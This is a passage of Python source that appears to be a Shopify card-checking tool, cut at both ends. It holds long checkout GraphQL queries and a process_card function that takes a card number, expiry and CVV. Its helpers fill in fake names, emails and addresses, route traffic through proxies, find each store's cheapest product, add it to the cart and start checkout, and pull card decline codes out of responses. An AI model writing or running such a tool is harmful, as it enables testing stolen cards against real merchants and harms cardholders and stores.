DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

C2C = {
    "USD": "US",
    "CAD": "CA", 
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    if tcn in book:
        return book[tcn]

    ccn = C2C.get(cc)

    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]

def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))
    
    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    
    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return None

def is_captcha_required(response_text):
    if not response_text:
        return False
    
    indicators = [
        'CAPTCHA_REQUIRED',
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        'captcha required',
        'CAPTCHA CHALLENGE',
        'hcaptcha',
        'h-captcha'
    ]
    
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False

async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data, 
    checkout_url, max_retries=1, solve_captcha=True
):
    original_variables = json_data.get('variables', {}).copy()
    
    for attempt in range(max_retries + 1):
        try:
            response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
            response_text = await response.text()
            return response, response_text, False
            
        except Exception as e:
            if attempt == max_retries:
                return None, str(e), False
            await asyncio.sleep(1)
    
    return response, response_text, False

async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
                if resp.status != 200:
                    return False, f"<b>Site Error! Status: {resp.status}</b>"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "<b>Not Shopify!</b>"

                try:
                    result = json.loads(text)['products']
                except Exception:
                    return False, "<b>Invalid products response</b>"
                if not result:
                    return False, "<b>No Products!</b>"

        min_price = float('inf')
        min_product = None

        for product in result:
            if not product.get('variants'):
                continue
            
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        price = float(price.replace(',', ''))
                    else:
                        price = float(price)

                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        
        if isinstance(min_product, dict) and min_product.get('variant_id'):
            return min_product
        else:
            return False, "<b>No Valid Products</b>"

    except aiohttp.ClientError as e:
        return False, f"<b>Proxy Error: {str(e)}</b>"
    except Exception as e:
        return False, f"error: {str(e)}"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    
    return message[:50]

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    displayName = ""
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl,
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info['variant_id']

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=55)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            cart_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/javascript'
            }
            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
            
            if cart_resp.status != 200:
                cart_headers_alt = {
                    **headers,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
            
            if cart_resp.status != 200:
                return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency

            checkout_headers = {
                **headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1'
            }
